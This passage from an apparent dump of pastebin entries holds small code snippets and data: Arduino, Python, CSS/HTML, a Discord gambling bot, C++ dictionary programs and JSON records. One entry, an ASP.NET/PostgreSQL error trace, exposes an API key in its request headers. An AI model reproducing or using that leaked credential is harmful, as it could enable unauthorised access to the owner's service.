					{""@type"":""Product"",""name"":""Caterpillar Soft Play Toy"",""url"":""https://www.implay.co.uk/collections/animals/products/crawling-caterpillar"",""image"":""https://www.implay.co.uk/cdn/shop/products/Crawling-Caterpillar_720x.jpg?v=1579682910"",""offers"":
						{""@type"":""Offer"",""price"":""64.99"",""priceCurrency"":""GBP""
						}
					},
					{""@type"":""Product"",""name"":""2nd product on the list"",""url"":""https://www.implay.co.uk/something"",""image"":""https://www.implay.co.uk/something.jpg"",""offers"":
						{""@type"":""Offer"",""price"":""99.99"",""priceCurrency"":""GBP""
						}
					},
					{""@type"":""Product"",""name"":""Last product on the list"",""url"":""https://www.implay.co.uk/something"",""image"":""https://www.implay.co.uk/something.jpg"",""offers"":
						{""@type"":""Offer"",""price"":""99.99"",""priceCurrency"":""GBP""
						}
					}
				]
			}
		}
	}
</script>"
KBydGzkk,Button test,Szerelo,C,Tuesday 28th of May 2024 08:46:16 AM CDT,"// Demo program a következő panelhez: https://github.com/the-developer-guy/PracticeShield/tree/main/hu
// 2024.05.28. Teremi József

// A nyomógombok és a kapcsoló tesztelése
// A nyomógomb megnyomására 1 vagy 3 LED bekapcsol, a kapcsoló állásától függően

#define POT A0      // A potenciométert az A0-ás pinre csatlakoztattuk
#define BTN1 A2     // Az 1. nyomógombot az A2-es pinre csatlakoztattuk
#define BTN2 A1     // A 2. nyomógombot az A1-es pinre csatlakoztattuk
#define SWITCH A3   // A kapcsolót az A3-es pinre csatlakoztattuk
#define LED1 2     // Az 1. LED-et a D2-es pinre csatlakoztattuk
#define LED2 3     // A 2. LED-et a D3-as pinre csatlakoztattuk
#define LED3 4     // A 3. LED-et a D4-es pinre csatlakoztattuk
#define LED4 5
#define LED5 6
#define LED6 7
#define LED7 8
#define LED8 9
#define BUZZER 11  // A hangszórót a D11-es pinre csatlakoztattuk


bool button1State = LOW;   // A nyomógomb aktuális állapota
bool button2State = LOW;   // A nyomógomb aktuális állapota
bool switchState = LOW;     // A kapcsoló aktuális állapota
bool lastButton1State = LOW; // Az előző nyomógomb állapot
bool lastButton2State = LOW; // Az előző nyomógomb állapot
bool lastSwitchState = LOW;  // A előző kapcsoló állapot
unsigned long lastDebounceTime1 = 0;  // Az 1. nyomógomb utolsó prellmentes időpontja
unsigned long lastDebounceTime2 = 0;  // A 2. nyomógomb utolsó prellmentes időpontja
unsigned long lastDebounceTime3 = 0;  // A kapcsoló utolsó prellmentes időpontja
unsigned long debounceDelay = 50;    // A prellmentes idő beállítása

void setup() {
  // Beállítjuk a bemenetként használt pinek irányát.
  pinMode(BTN1, INPUT);
  pinMode(BTN2, INPUT);
  pinMode(SWITCH, INPUT);
  // Beállítjuk a kimenetként használt pinek irányát.
  pinMode(LED1, OUTPUT);
  pinMode(LED2, OUTPUT);
  pinMode(LED3, OUTPUT);
  pinMode(LED4, OUTPUT);
  pinMode(LED5, OUTPUT);
  pinMode(LED6, OUTPUT);
  pinMode(LED7, OUTPUT);
  pinMode(LED8, OUTPUT);
  pinMode(BUZZER, OUTPUT);

  digitalWrite(LED1,HIGH);
  digitalWrite(LED5,HIGH);
  delay(1000);  
  digitalWrite(LED1,LOW);
  digitalWrite(LED5,LOW);
}

void loop() {
  bool reading1 = !digitalRead(BTN1); // Olvassuk be az 1. nyomógomb állapotát negálva, ha a GND-ra van csatlakoztatva
  bool reading2 = !digitalRead(BTN2); // Olvassuk be a 2. nyomógomb állapotát negálva, ha a GND-ra van csatlakoztatva
  bool reading3 = digitalRead(SWITCH); // Olvassuk be a kapcsoló állapotát

  // Ha az 1. gomb állapota változott
  if (reading1 != lastButton1State) {
    // Frissítjük a prellmentes időtartam kezdeti idejét
    lastDebounceTime1 = millis();
  }

  // Ellenőrizzük, hogy a gomb állapota stabil-e a prellmentes idő után
  if ((millis() - lastDebounceTime1) > debounceDelay) {
    // Ha igen, akkor frissítjük a gomb állapotát
    if (reading1 != button1State) {
      button1State = reading1;

      // Ha a gombot lenyomtad
      if (button1State == HIGH) {
        digitalWrite(LED7,HIGH);    // Bal szélső LED bekapcsolása
        if (reading3==HIGH){        // Ha a kapcsoló jobbra van állítva
          digitalWrite(LED6,HIGH);  // Bal szélső alatti LED bekapcsolása
          digitalWrite(LED8,HIGH);  // Bal szélső feletti LED bekapcsolása
        }
      } 
      // Ha a gombot elengedted
      else {
        // Bal oldali LED-ek kikapcsolása
        digitalWrite(LED6,LOW);
        digitalWrite(LED7,LOW);
        digitalWrite(LED8,LOW);
      }
    }
  }
  // Ha a 2. gomb állapota változott
  if (reading2 != lastButton2State) {
    // Frissítjük a prellmentes időtartam kezdeti idejét
    lastDebounceTime2 = millis();
  }

  // Ellenőrizzük, hogy a gomb állapota stabil-e a prellmentes idő után
  if ((millis() - lastDebounceTime2) > debounceDelay) {
    // Ha igen, akkor frissítjük a gomb állapotát
    if (reading2 != button2State) {
      button2State = reading2;

      // Ha a gombot lenyomtad
      if (button2State == HIGH) {
        digitalWrite(LED3,HIGH);    // Jobb szélső LED bekapcsolása
        if (reading3==HIGH){        // Ha a kapcsoló jobbra van állítva
          digitalWrite(LED2,HIGH);  // Jobb szélső feletti LED bekapcsolása
          digitalWrite(LED4,HIGH);  // Jobb szélső alatti LED bekapcsolása
        }
      } 
      // Ha a gombot elengedted
      else {
        // Jobb oldali LED-ek kikapcsolása
        digitalWrite(LED2,LOW);
        digitalWrite(LED3,LOW);
        digitalWrite(LED4,LOW);
      }
    }
  }

  // Ha a kapcsoló állapota változott
  if (reading3 != lastSwitchState) {
    // Frissítjük a prellmentes időtartam kezdeti idejét
    lastDebounceTime3 = millis();
  }

  // Ellenőrizzük, hogy a kapcsoló állapota stabil-e a prellmentes idő után
  if ((millis() - lastDebounceTime3) > debounceDelay) {
    // Ha igen, akkor frissítjük a kapcsoló állapotát
    if (reading3 != switchState) {
      switchState = reading3;

      // Ha a kapcsolót balra állítottad
      if (switchState == LOW) {
        // Kapcsoló balra van állítva
      } 
      // Ha a kapcsolót jobbra állítottad
      else {
        // Kapcsoló jobbra van állítva
      }
    }
  }

  // A nyomógombok és kapcsoló aktuális állapotát eltároljuk az előző állapotban
  lastButton1State = reading1;
  lastButton2State = reading2;
  lastSwitchState = reading3;
}

// END"
rJPYexXa,*args,Nenogzar,Python,Tuesday 28th of May 2024 07:57:26 AM CDT,"def len_list(*args):
    return len(args)


list1 = [1, 2, 3]
list2 = [4, 5]
list3 = [6, 7, 8, 9]

matrix = [[1, 2, 3], [4, 5], [6, 7, 8, 9]]
matrix1 = [[1, 2, 3], [4, 5], [6, 7, 8, 9]]

print(len_list(list1))
print(len_list(*list1))
print(len_list(*list1, *list2, *list3))
print(len_list(*matrix))
print(len_list(*matrix, *matrix1))"
81CjckjL,flex-shrink.css,ivo_petkov01,CSS,Tuesday 28th of May 2024 07:38:46 AM CDT,".flex-container {
    width: 400px;
    padding: 1em;
    border: 2px solid blue;
    display: flex;
    align-items: flex-start;
}

.flex-item {
    background-color: #eee;
    border: 2px solid #000;
    padding: 20px;
}

.flex-container.flex-shrink-one .flex-item {
    flex-shrink: 1;
}

.flex-container.flex-shrink-zero .flex-item {
    flex-shrink: 0;
}

.flex-container.flex-shrink-2nd-only .flex-item {
    flex-shrink: 0;
}

.flex-container.flex-shrink-2nd-only .flex-item:nth-child(2) {
    flex-shrink: 1;
}"
utbpMVMy,flex-shrink.html,ivo_petkov01,HTML 5,Tuesday 28th of May 2024 07:34:53 AM CDT,"<!DOCTYPE html>
<html lang=""en"">

<head>
    <meta charset=""UTF-8"">
    <meta name=""viewport"" content=""width=device-width, initial-scale=1.0"">
    <link rel=""stylesheet"" href=""flex-shrink.css"">
    <title>Task 09</title>
</head>

<body>
    <h1>flex-shrink</h1>

    <h2>flex-shrink: 1; (default)</h2>
    <div class=""flex-container flex-shrink-one"">
        <div class=""flex-item"">1</div>
        <div class=""flex-item"">2</div>
        <div class=""flex-item"">3</div>
    </div>

    <h2>flex-shrink: 0;</h2>
    <div class=""flex-container flex-shrink-zero"">
        <div class=""flex-item"">1</div>
        <div class=""flex-item"">2</div>
        <div class=""flex-item"">3</div>
    </div>

    <h2>flex-shrink, shrink 2nd child only</h2>
    <div class=""flex-container flex-shrink-2nd-only"">
        <div class=""flex-item"">1</div>
        <div class=""flex-item"">2</div>
        <div class=""flex-item"">3</div>
    </div>
</body>

</html>"
Rg10BFMC,kurwa,threatww,JavaScript,Tuesday 28th of May 2024 07:28:57 AM CDT,"const { Client, GatewayIntentBits, REST, Routes, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const { token, clientId, guildId } = require('./config.json');

// Initialize the bot client with intents
const client = new Client({ intents: [GatewayIntentBits.Guilds] });

// Dictionary to store user balances
const userBalances = {};

// Function to get the user's balance, initializing if not present
function getBalance(userId) {
    if (!userBalances[userId]) {
        userBalances[userId] = 100;  // Starting balance
    }
    return userBalances[userId];
}

// Function to update the user's balance
function updateBalance(userId, amount) {
    if (userBalances[userId]) {
        userBalances[userId] += amount;
    } else {
        userBalances[userId] = 100 + amount;
    }
}

// Register slash commands
const commands = [
    {
        name: 'coinflip',
        description: 'Bet on a coin flip',
        options: [
            {
                name: 'choice',
                type: 3,  // STRING
                description: 'heads or tails',
                required: true,
            },
            {
                name: 'amount',
                type: 4,  // INTEGER
                description: 'amount to bet',
                required: true,
            },
        ],
    },
    {
        name: 'roulette',
        description: 'Bet on a roulette number or color',
        options: [
            {
                name: 'bet',
                type: 3,  // STRING
                description: 'number (1-36) or color (red/black)',
                required: true,
            },
            {
                name: 'amount',
                type: 4,  // INTEGER
                description: 'amount to bet',
                required: true,
            },
        ],
    },
    {
        name: 'towers',
        description: 'Climb the tower to win',
        options: [
            {
                name: 'difficulty',
                type: 3,  // STRING
                description: 'difficulty level (easy, medium, hard)',
                required: true,
                choices: [
                    { name: 'Easy', value: 'easy' },
                    { name: 'Medium', value: 'medium' },
                    { name: 'Hard', value: 'hard' },
                ],
            },
            {
                name: 'amount',
                type: 4,  // INTEGER
                description: 'amount to bet',
                required: true,
            },
        ],
    },
    {
        name: 'balance',
        description: 'Check your balance',
    },
];

const rest = new REST({ version: '10' }).setToken(token);

(async () => {
    try {
        console.log('Started refreshing application (/) commands.');

        await rest.put(
            Routes.applicationGuildCommands(clientId, guildId),
            { body: commands },
        );

        console.log('Successfully reloaded application (/) commands.');
    } catch (error) {
        console.error(error);
    }
})();

client.once('ready', () => {
    console.log(`Logged in as ${client.user.tag}`);
});

// Towers command handler
client.on('interactionCreate', async interaction => {
    if (!interaction.isCommand()) return;

    const { commandName, options } = interaction;
    const userId = interaction.user.id;

    if (commandName === 'towers') {
        const difficulty = options.getString('difficulty');
        const amount = options.getInteger('amount');
        const balance = getBalance(userId);

        if (amount > balance || amount <= 0) {
            await interaction.reply({ content: 'You cannot bet more than your balance or less than 1!', ephemeral: true });
            return;
        }

        const difficultyLevels = {
            easy: 1,
            medium: 2,
            hard: 3
        };

        const numOfMines = difficultyLevels[difficulty];
        const height = 1; // Start at height 1

        const buttons = generateButtons(height, numOfMines);

        await interaction.reply({
            content: `Towers game started! Difficulty: ${difficulty}`,
            components: buttons,
        });
    }
});

// Button interaction handler for towers game
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const userId = interaction.user.id;
    const [action, height, amount, difficulty, mine] = interaction.customId.split('_');
    const balance = getBalance(userId);

    if (action === 'towers') {
        const difficultyLevels = {
            easy: 1,
            medium: 2,
            hard: 3
        };

        const numOfMines = difficultyLevels[difficulty];
        const currentHeight = parseInt(height);
        const betAmount = parseInt(amount);
        const isMine = mine === 'mine';

        if (isMine) {
            updateBalance(userId, -betAmount);
            await interaction.update({
                content: `You hit a mine! You lose ${betAmount} zł. Your new balance is ${getBalance(userId)} zł.`,
                components: [],
            });
        } else {
            if (currentHeight >= 10) {
                const winnings = betAmount * currentHeight;
                updateBalance(userId, winnings);
                await interaction.update({
                    content: `Congratulations! You successfully climbed to the height of ${currentHeight}. You win ${winnings} zł! Your new balance is ${getBalance(userId)} zł.`,
                    components: [],
                });
            } else {
                const nextHeight = currentHeight + 1;
                const buttons = generateButtons(nextHeight, numOfMines);

                await interaction.update({
                    content: `Climbing... Current height: ${nextHeight}`,
                    components: buttons,
                });
            }
        }
    }
});

// Function to generate buttons for towers game
function generateButtons(height, numOfMines) {
    const buttons = [];
    const minePositions = Array.from({ length: 4 }, (_, i) => i).sort(() => 0.5 - Math.random()).slice(0, numOfMines);

    for (let i = 0; i < 4; i++) {
        buttons.push(
            new ButtonBuilder()
                .setCustomId(`towers_${height}_${numOfMines}_${i}`)
                .setLabel('♦️') // Diamond emoji
                .setStyle(ButtonStyle.Primary),
        );
    }

    return [new ActionRowBuilder().addComponents(...buttons)];
}

// Button interaction handler for towers game
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const userId = interaction.user.id;
    const [action, height, difficulty, buttonIndex] = interaction.customId.split('_');
    const balance = getBalance(userId);

    if (action === 'towers') {
        const currentHeight = parseInt(height);
        const options = interaction.message.interaction?.options;
        if (!options) return; // Exit if options are not available
        const betAmountOption = options.find(option => option.name === 'amount');
        if (!betAmountOption) return; // Exit if bet amount option is not available

        const betAmount = parseInt(betAmountOption.value);
        const isMine = parseInt(buttonIndex) < parseInt(difficulty);

        if (isMine) {
            updateBalance(userId, -betAmount);
            await interaction.update({
                content: `💥 You hit a mine! You lose ${betAmount} zł. Your new balance is ${getBalance(userId)} zł.`,
                components: [],
            });
        } else {
            if (currentHeight >= 10) {
                const winnings = betAmount * currentHeight;
                updateBalance(userId, winnings);
                await interaction.update({
                    content: `🎉 Congratulations! You successfully climbed to the height of 10. You win ${winnings} zł! Your new balance is ${getBalance(userId)} zł.`,
                    components: [],
                });
            } else {
                const nextHeight = currentHeight + 1;
                const buttons = generateButtons(nextHeight, parseInt(difficulty));

                // Send a separate message with cash out button
                const cashOutMessage = `💰 Current balance: ${getBalance(userId)} zł. Click below to cash out your winnings.`;
                const cashOutButton = new ButtonBuilder()
                    .setCustomId('cash_out')
                    .setLabel('Cash Out')
                    .setStyle(ButtonStyle.Primary);
                const actionRow = new ActionRowBuilder().addComponents(cashOutButton);
                await interaction.channel.send({ content: cashOutMessage, components: [actionRow] });

                await interaction.update({
                    content: `Climbing... Current height: ${nextHeight}`,
                    components: buttons,
                });
            }
        }
    }
});

// Button interaction handler for cashing out
client.on('interactionCreate', async interaction => {
    if (!interaction.isButton()) return;

    const userId = interaction.user.id;
    const action = interaction.customId;

    if (action === 'cash_out') {
        const balance = getBalance(userId);
        await interaction.update({
            content: `💰 Cash Out: You now have ${balance} zł. Thank you for playing!`,
            components: [],
        });
    }
});
client.login(token)"
M7G0TjZF,ddddddd,portalxwe,C#,Tuesday 28th of May 2024 06:41:04 AM CDT,"d
























ddddddd"
v6jtW5Zf,Untitled,portalxwe,C++,Tuesday 28th of May 2024 06:40:46 AM CDT,"dax
dd



















dax"
V0wiz2BL,邀您一起看：大佬网盘,xiaomianao666,JavaScript,Tuesday 28th of May 2024 06:36:42 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥大佬网盘@@
pDhBcHgY,Untitled,35657,C++,Tuesday 28th of May 2024 06:26:14 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <fstream>
#include <map>
#include <Windows.h>


int main() {

    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);

    std::ifstream fin(""file.txt"");

    if (!fin.is_open()) {
        std::cout << ""Ошибка открытия файла"" << std::endl;
    }
    else {
        std::string str;

        std::map<std::string, int> dictionary;

        while (!fin.eof()) {
            fin >> str;

            while (str.size() > 0 && (str[0] < 'А' || str[0] > 'я')) {
                str.erase(str.begin());
            }
            while (str.size() > 0 && (str.back() < 'А' || str.back() > 'я')) {
                str.pop_back();
            }
            if (str.size() > 0) {
                for (char& ch : str) { // если не нужен перевод в нижний регистр, то можно не делать
                    if (ch >= 'А' && ch <= 'Я') {
                        ch += 32;
                    }
                }
                dictionary[str]++;
            }
        }

        for (auto a : dictionary) {
            std::cout << a.first << "" "" << a.second << std::endl;
        }

        fin.close();
    }
}
"
5tA98NK8,Untitled,Armen_06,Dart,Tuesday 28th of May 2024 06:07:35 AM CDT,"500: Npgsql.PostgresException (0x80004005): 42703: column u.last_seen_date does not exist

POSITION: 65
   at Npgsql.Internal.NpgsqlConnector.ReadMessageLong(Boolean async, DataRowLoadingMode dataRowLoadingMode, Boolean readingNotifications, Boolean isReadingPrependedMessage)
   at System.Runtime.CompilerServices.PoolingAsyncValueTaskMethodBuilder`1.StateMachineBox`1.System.Threading.Tasks.Sources.IValueTaskSource<TResult>.GetResult(Int16 token)
   at Npgsql.NpgsqlDataReader.NextResult(Boolean async, Boolean isConsuming, CancellationToken cancellationToken)
   at Npgsql.NpgsqlDataReader.NextResult(Boolean async, Boolean isConsuming, CancellationToken cancellationToken)
   at Npgsql.NpgsqlCommand.ExecuteReader(Boolean async, CommandBehavior behavior, CancellationToken cancellationToken)
   at Npgsql.NpgsqlCommand.ExecuteReader(Boolean async, CommandBehavior behavior, CancellationToken cancellationToken)
   at Npgsql.NpgsqlCommand.ExecuteDbDataReaderAsync(CommandBehavior behavior, CancellationToken cancellationToken)
   at Microsoft.EntityFrameworkCore.Storage.RelationalCommand.ExecuteReaderAsync(RelationalCommandParameterObject parameterObject, CancellationToken cancellationToken)
   at Microsoft.EntityFrameworkCore.Storage.RelationalCommand.ExecuteReaderAsync(RelationalCommandParameterObject parameterObject, CancellationToken cancellationToken)
   at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerable`1.AsyncEnumerator.InitializeReaderAsync(AsyncEnumerator enumerator, CancellationToken cancellationToken)
   at Npgsql.EntityFrameworkCore.PostgreSQL.Storage.Internal.NpgsqlExecutionStrategy.ExecuteAsync[TState,TResult](TState state, Func`4 operation, Func`4 verifySucceeded, CancellationToken cancellationToken)
   at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerable`1.AsyncEnumerator.MoveNextAsync()
   at Microsoft.EntityFrameworkCore.Query.ShapedQueryCompilingExpressionVisitor.SingleOrDefaultAsync[TSource](IAsyncEnumerable`1 asyncEnumerable, CancellationToken cancellationToken)
   at Microsoft.EntityFrameworkCore.Query.ShapedQueryCompilingExpressionVisitor.SingleOrDefaultAsync[TSource](IAsyncEnumerable`1 asyncEnumerable, CancellationToken cancellationToken)
   at Ms.Swish.BusinessLogic.Services.UserService.Authenticate(String numberPrefix, String number, String password) in /src/Ms.Swish.BusinessLogic/Services/UserService.cs:line 134
   at Ms.Swish.Controllers.UsersController.NewAuthenticate(UserAuthenticateDto userAuthenticate) in /src/Ms.Swish/Controllers/UsersController.cs:line 106
   at lambda_method130(Closure, Object)
   at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.AwaitableObjectResultExecutor.Execute(ActionContext actionContext, IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments)
   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeActionMethodAsync>g__Awaited|12_0(ControllerActionInvoker invoker, ValueTask`1 actionResultValueTask)
   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeNextActionFilterAsync>g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context)
   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
   at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.<InvokeInnerFilterAsync>g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeNextExceptionFilterAsync>g__Awaited|26_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.Rethrow(ExceptionContextSealed context)
   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.Next(State& next, Scope& scope, Object& state, Boolean& isCompleted)
   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeFilterPipelineAsync>g__Awaited|20_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted)
   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Logged|17_1(ResourceInvoker invoker)
   at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.<InvokeAsync>g__Logged|17_1(ResourceInvoker invoker)
   at Microsoft.AspNetCore.Routing.EndpointMiddleware.<Invoke>g__AwaitRequestTask|7_0(Endpoint endpoint, Task requestTask, ILogger logger)
   at Microsoft.AspNetCore.Authorization.AuthorizationMiddleware.Invoke(HttpContext context)
   at Swashbuckle.AspNetCore.SwaggerUI.SwaggerUIMiddleware.Invoke(HttpContext httpContext)
   at Swashbuckle.AspNetCore.Swagger.SwaggerMiddleware.Invoke(HttpContext httpContext, ISwaggerProvider swaggerProvider)
   at Serilog.AspNetCore.RequestLoggingMiddleware.Invoke(HttpContext httpContext)
   at Microsoft.AspNetCore.Diagnostics.DeveloperExceptionPageMiddlewareImpl.Invoke(HttpContext context)
  Exception data:
    Severity: ERROR
    SqlState: 42703
    MessageText: column u.last_seen_date does not exist
    Position: 65
    File: parse_relation.c
    Line: 3638
    Routine: errorMissingColumn

HEADERS
=======
Connection: keep-alive
Host: swagger.swish.su
User-Agent: Dart/3.2 (dart:io)
Accept-Encoding: gzip
Content-Type: application/json
Content-Length: 64
apikey: 6074b077-e86f-473f-aa2e-b78ecbd4862f
"
YHuU93X7,data940,TestGuy1,JSON,Tuesday 28th of May 2024 06:00:07 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '035bc2897adf4b8d1fd5f94c2f0cf6166d61b8c5ef46a808c4cc73c14d15f1725d1c0ba3fe41c8dbc60b1329f47813d19730125fe0f6530b5827c7643578702e96703613aede43a608ad549a5e8ff3ae8b2253bfaeb4538cb4e70830b6e879e2deb2142ced37324ddf9895a7b4dde64df74001a5d6a7aaf744349015fdfc3b05',
  otherdata: [
    'b7048e78e51205970f3e7747170bf856',
    '8eec33c5fba4ce9f0df6bbfd5040be25',
    '411303bf126a172fd027b0a8f32a6486',
    '24eed180400d6915fb82a630e4beaa51',
    '563437a67eb7f8b29b7246c4f941ea27',
    '5c923831493fe0a8b485a674d3ebabd3',
    'ba8670a5120e56b3ecd9ef202ea62488',
    'dcd152deb05e8458ede2bf409fb73cbd'
  ]
}"
Yi14qmS7,Untitled,35657,C++,Tuesday 28th of May 2024 05:47:20 AM CDT,"#include <iostream>
#include <vector>
#include <algorithm>
#include <fstream>
#include <map>
#include <Windows.h>


int main() {

    SetConsoleCP(1251);
    SetConsoleOutputCP(1251);

    std::ifstream fin(""eng-rus dictionary.txt"");

    std::ofstream fout(""rus-eng dictionary.txt"");

    if (!fin.is_open() || !fout.is_open()) {
        std::cout << ""Ошибка открытия файла"" << std::endl;
    }
    else {
        std::string word, translation;

        std::map<std::string, std::string> dictionary;


        // чтобы не считывал пустые строки в конце
        fin >> word >> translation; 
        while (!fin.eof()) {
            dictionary[translation] = word;
            fin >> word >> translation;
        }

        for (auto a : dictionary) {
            fout << a.first;
            for (int i = 0; i < 20 - a.first.size(); i++) {
                fout << "" "";
            } // чтобы выровнить по отступам
            fout << a.second << std::endl;
        }
        fin.close();
        fout.close();
    }
}
"
PBfa4NuC,[MUF] Dealer - User Vehicle Detail,ffajarpratama,JSON,Tuesday 28th of May 2024 05:33:32 AM CDT,"{
    ""success"": true,
    ""data"": {
        ""user_vehicle_id"": ""cb36d7f8-cc44-43cd-a891-7b721c7d95d4"",
        ""city_id"": ""5a78bb52-7868-4ebb-ad42-5cd18f15e103"",
        ""vehicle_brand_id"": ""56c7ad8e-e6cd-4358-ab3b-e2fb443da2e3"",
        ""vehicle_variant_id"": ""f7f62586-ae2d-4ce5-b96c-c23a9da00009"",
        ""vehicle_type_id"": ""36342fcb-bc01-41f1-8853-93abc770a279"",
        ""vehicle_color_id"": ""75e87802-5e7d-46f9-a6a9-3cf8271ef403"",
        ""vehicle_series_id"": ""62264377-a71c-4b46-8119-8789cb22656c"",
        ""year"": 2020,
        ""license_plate"": ""AA"",
        ""is_plate_number_even"": false,
        ""odometer"": 2400,
        ""ownership_status"": ""individual"",
        ""ac_condition"": ""normal"",
        ""tyre_condition"": ""80 - 89%"",
        ""body_condition"": ""Baret ringan"",
        ""flood_damage"": false,
        ""registration_validity_period"": ""04-2023"",
        ""description"": ""Ini mau disii dengan apa"",
        ""price"": 240000000,
        ""type"": ""dealer"",
        ""created_by"": ""a90fcf6c-2d54-4ee1-ab5f-86d663156a47"",
        ""dealer_id"": ""475d3274-6a26-40b3-8983-3be0dd681922"",
        ""approved_by"": null,
        ""approved_at"": 0,
        ""updated_by"": null,
        ""status"": ""revision-required"",
        ""reason"": """",
        ""total_submission_field"": 21,
        ""total_submission_field_reviewed"": 21,
        ""total_submission_field_edited"": 0,
        ""total_submission_field_rejected"": 1,
        ""review_draft_at"": 0,
        ""review_finished_at"": 1715936340,
        ""is_recommended"": false,
        ""is_popular"": false,
        ""is_trending"": false,
        ""assignee_id"": ""6fc8e022-bbd0-4656-9a01-9730cf41c08b"",
        ""views_count"": 4,
        ""imported_at"": 0,
        ""created_at"": 1714364288,
        ""updated_at"": 1715936340,
        ""deleted_at"": 0,
        ""city"": {
            ""city_id"": ""5a78bb52-7868-4ebb-ad42-5cd18f15e103"",
            ""moas_id"": 334,
            ""name"": ""Aceh Barat Daya"",
            ""position"": 100,
            ""province_id"": ""7bfdb9cf-7340-415b-b952-11edcd9bf2af"",
            ""created_at"": 1702442413,
            ""updated_at"": 1702442413,
            ""deleted_at"": 0,
            ""province"": {
                ""province_id"": ""7bfdb9cf-7340-415b-b952-11edcd9bf2af"",
                ""name"": ""Nanggroe Aceh Darussalam (NAD)"",
                ""created_at"": 1702435790,
                ""updated_at"": 1702435790,
                ""deleted_at"": 0
            }
        },
        ""vehicle_brand"": {
            ""vehicle_brand_id"": ""56c7ad8e-e6cd-4358-ab3b-e2fb443da2e3"",
            ""name"": ""ASTON MARTIN"",
            ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
            ""code"": ""003"",
            ""media_id"": ""82bcc828-8ba5-4d20-be5d-805a78bc38d7"",
            ""created_at"": 1691577703,
            ""updated_at"": 1691577703,
            ""deleted_at"": 0,
            ""vehicle_group"": null,
            ""media"": null
        },
        ""vehicle_variant"": {
            ""vehicle_variant_id"": ""f7f62586-ae2d-4ce5-b96c-c23a9da00009"",
            ""name"": ""AMR A Fierce New Breed"",
            ""vehicle_series_id"": ""62264377-a71c-4b46-8119-8789cb22656c"",
            ""vehicle_brand_id"": ""56c7ad8e-e6cd-4358-ab3b-e2fb443da2e3"",
            ""vehicle_category_id"": ""f991e8e2-2b0d-40f7-902f-181e24974a44"",
            ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
            ""vehicle_fuel_id"": ""7f5ceae2-24ff-4add-a3ca-97352cb1443f"",
            ""vehicle_transmission_id"": ""5a395636-3a47-432f-997f-cc215f80fe1e"",
            ""vehicle_type_id"": ""b32b65cb-3a97-4bfb-bf24-07f7cd07457d"",
            ""code"": """",
            ""moas_id"": null,
            ""is_recommended"": false,
            ""is_popular"": false,
            ""is_trending"": false,
            ""created_at"": 1701253610,
            ""updated_at"": 1701253610,
            ""deleted_at"": 0,
            ""all_specs"": null,
            ""vehicle_series"": null,
            ""vehicle_brand"": null,
            ""vehicle_category"": null,
            ""vehicle_group"": null,
            ""vehicle_fuel"": null,
            ""vehicle_transmission"": null,
            ""vehicle_specs"": null,
            ""vehicle_otr"": null,
            ""vehicle_type"": null
        },
        ""vehicle_type"": {
            ""vehicle_type_id"": ""36342fcb-bc01-41f1-8853-93abc770a279"",
            ""name"": ""Mobil Bekas"",
            ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
            ""code"": ""004"",
            ""code_mapping"": ""UC"",
            ""created_at"": 0,
            ""updated_at"": 0,
            ""deleted_at"": 0,
            ""vehicle_group"": {
                ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
                ""name"": ""Mobil"",
                ""code"": ""002"",
                ""kind"": 2,
                ""created_at"": 1694492214,
                ""updated_at"": 1694492214,
                ""deleted_at"": 0
            }
        },
        ""vehicle_color"": {
            ""vehicle_color_id"": ""75e87802-5e7d-46f9-a6a9-3cf8271ef403"",
            ""name"": ""Silver"",
            ""code"": ""008"",
            ""hex"": ""#D0D5DD"",
            ""created_at"": 1702731982,
            ""updated_at"": 1702731982,
            ""deleted_at"": 0
        },
        ""vehicle_series"": {
            ""vehicle_series_id"": ""62264377-a71c-4b46-8119-8789cb22656c"",
            ""name"": ""VANTAGE"",
            ""vehicle_brand_id"": ""56c7ad8e-e6cd-4358-ab3b-e2fb443da2e3"",
            ""vehicle_group_id"": ""844e43ec-7493-41a7-b2ff-b9f1c3c138d4"",
            ""code"": """",
            ""moas_id"": 0,
            ""specification"": """",
            ""vehicle_category_id"": ""f991e8e2-2b0d-40f7-902f-181e24974a44"",
            ""last_sync_at"": 0,
            ""synced_by"": null,
            ""created_at"": 1701242399,
            ""updated_at"": 1701242399,
            ""deleted_at"": 0,
            ""min_price"": 0,
            ""max_price"": 0,
            ""domicile_name"": """",
            ""wishlisted"": false,
            ""vehicle_brand"": null,
